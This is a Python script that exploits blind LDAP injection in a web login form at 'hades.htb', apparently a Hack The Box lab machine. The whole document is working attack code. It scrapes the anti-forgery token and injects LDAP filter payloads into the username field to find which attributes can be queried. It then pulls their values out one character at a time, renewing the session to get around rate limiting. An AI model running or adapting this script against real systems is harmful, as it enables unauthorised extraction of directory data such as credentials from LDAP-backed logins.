# A script for exploiting the LDAP SSO login

import requests
import urllib3
from bs4 import BeautifulSoup
import urllib.parse
import string
import re
urllib3.disable_warnings()

url = "https://hades.htb/login"

class newSession:
    def __init__(self, token=None, cookie=None, data=None):
        self.token = token
        self.cookie = cookie
        self.data = data

    def renew(self):
        session = requests.Session()
        response = session.get(url, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find("input", {"name": "__RequestVerificationToken"})
        cookie = session.cookies.get("__RequestVerificationToken")
        
        self.token = token['value']
        self.cookie = {"__RequestVerificationToken":cookie}

    def post(self, payload):
        self.data = {"__RequestVerificationToken":self.token, "Username":payload, "Password":"a"}
        request = requests.post(url=url, cookies=self.cookie, data=self.data, verify=False)
        return request
    
def encode_char(char):
    special_chars = {
        "*": "\\2a", "(": "\\28", ")": "\\29", "\\": "\\5c", "\0": "\\00"
    }
    return special_chars.get(char, char)

def decode_chars(char):
    special_chars = {
        "\\2a": "*", "\\28": "(", "\\29": ")", "\\5c": "\\", "\\00": "\0"
    }
    pattern = re.compile(r"\\2a|\\28|\\29|\\5c|\\00")
    decoded = pattern.sub(lambda match: special_chars[match.group(0)], char)
    return decoded


chars = string.printable
injectable_fields = []

session = newSession()
session.renew()

with open("ldap_fields.txt", "r") as fields:
    for field in fields:
        field = field.strip()
        payload = urllib.parse.quote(f"*)({field}=*")
        r = session.post(payload)

        if(r.status_code == 429):
            session.renew()
            r = session.post(payload)

        if("Login attempt failed" in r.text):
            print(field)
            injectable_fields.append(field.lower())

while True:
    field = input("select > ")
    if field == "show":
        for f in injectable_fields:
            print(f)
    elif field == "exit":
        break

    elif field.lower() in injectable_fields:
        blacklist = []
        fuzz = ''
        valid_chars = ''
        while True:
            for char in chars:
                Continue = True
                if(len(valid_chars+char) < 2):
                    if char.lower() in blacklist or len(char.strip()) < 1:
                        Continue = False
                    else:
                        blacklist.append(char)

                if Continue:
                    char = encode_char(char)
                    payload = urllib.parse.quote(f"*)({field}={fuzz+valid_chars+char}*")
                    r = session.post(payload)

                    if(r.status_code == 429):
                        session.renew()
                        r = session.post(payload)

                    if("Login attempt failed" in r.text):
                        valid_chars += char
                        print(decode_chars(fuzz+valid_chars), end="\r")
                        break
            else:
                print()
                valid_chars = ''
                if not Continue:
                    fuzz = input("fuzz > ")
                    if fuzz == "exit":
                        fuzz = ''
                        break
                    else:
                        blacklist = []
                        Continue = True
    else:
        print("invalid field")